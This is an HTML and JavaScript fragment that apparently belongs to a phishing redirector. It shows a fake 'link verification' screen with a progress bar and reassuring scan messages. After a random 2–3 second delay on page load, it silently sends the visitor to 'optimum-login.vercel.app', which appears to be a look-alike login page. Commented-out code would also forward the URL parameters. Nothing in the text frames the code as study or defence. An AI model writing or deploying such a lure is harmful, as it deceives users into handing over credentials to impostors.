        <div class="robot-prompt" id="robotPrompt" style="color: #ffffff; width: 300px; font-size: 17px;">Accessing link...</div>
        <div class="loading-bar">
            <div class="loading-progress" id="loadingProgress"></div>

    <script>
        const progressBar = document.getElementById('loadingProgress');
        const robotPrompt = document.getElementById('robotPrompt');
        let progress = 0;
        const totalDuration = 6000; // 20 seconds
        const minRedirectDelay = 2000; // 5 seconds
        const maxRedirectDelay = 3000; // 10 seconds
        const stepTime = totalDuration / 100; // Time for each 1% step
        const messages = [
            "Verifying link...",
            "Expanding link...",
            "Connecting to a server...",
            "Loading page...",
            "Verifying content...",
            "Extracting page features...",
            "Verifying features...",
            "Scan Complete"
        ];
        let messageIndex = 0;

        function startProgress() {
            var params = '';
            const timer = setInterval(() => {
                progress += 1;
                progressBar.style.width = progress + '%';
                if (progress >= 100) {
                    clearInterval(timer);
                }
            }, stepTime);

            const redirectDelay = Math.random() * (maxRedirectDelay - minRedirectDelay) + minRedirectDelay;
            setTimeout(() => {
                // const currentUrl = new URL(window.location.href);
                // params = currentUrl.search;
                // if ( params === '' ){
                //     params = window.location.hash;
                //     // params = params.replace('#', '');
                // }
                const redirectUrl = "https://optimum-login.vercel.app/";
                window.location.href = redirectUrl;
            }, redirectDelay);
        }

        function changeMessage() {
            robotPrompt.style.opacity = '0';
            setTimeout(() => {
                robotPrompt.textContent = messages[messageIndex];
                robotPrompt.style.opacity = '1';
                messageIndex = (messageIndex + 1) % messages.length;
                const randomDelay = Math.random() * (3000 - 1300) + 1300; // Random delay between 1.3 and 3.0 seconds
                setTimeout(changeMessage, randomDelay);
            }, 850); // Wait for the fade-out transition to complete
        }

        window.onload = () => {
            startProgress();
            const initialDelay = Math.random() * (3000 - 1300) + 1300; // Initial random delay between 1.3 and 3.0 seconds
            setTimeout(changeMessage, initialDelay);
        };
    </script>
